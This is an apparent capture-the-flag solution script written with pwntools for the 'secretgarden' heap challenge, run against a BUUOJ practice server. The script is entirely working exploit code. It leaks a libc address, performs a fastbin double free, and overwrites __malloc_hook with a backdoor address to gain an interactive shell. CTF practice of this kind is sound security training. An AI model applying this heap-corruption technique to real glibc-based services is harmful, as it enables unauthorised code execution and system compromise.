from pwn import *

#p = process('./secretgarden')
p = remote('node4.buuoj.cn', 27047)
elf = ELF('secretgarden')
libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size, name, color):
    sla(b'choice : ', b'1')
    sla(b'name :', str(size).encode())
    sa(b'flower :', name)
    sla(b'flower :', color)

def show():
    sla(b'choice : ', b'2')

def delete(idx):
    sla(b'choice : ', b'3')
    sla(b' garden:', str(idx).encode())

alloc(0x80, b'a', b'a') #0
alloc(0x80, b'a', b'a') #1

delete(0)
alloc(0x50, b'a' * 8, b'a') #2
show()
ru(b'a' * 8)
libc_base = u64(rv(6) + b'\0\0') - 0x68 - libc.sym['__malloc_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
backdoor = 0x400c5e
success('libc_base -> 0x%x' % libc_base)

#double free
alloc(0x60, b'a', b'a') #3
alloc(0x60, b'a', b'a') #4

alloc(0x28, b'a', b'a') #5
alloc(0x28, b'a', b'a') #6
alloc(0x28, b'a', b'a') #7
alloc(0x28, b'a', b'a') #8

[delete(5 + i) for i in range(4)]

delete(3)
delete(4)
delete(3)

alloc(0x60, p64(malloc_hook - 0x23), b'a')
alloc(0x60, b'a', b'a')
alloc(0x60, b'a', b'a')
alloc(0x60, b'a' * 0x13 + p64(backdoor), b'a')

sla(b'choice : ', b'1')

p.interactive()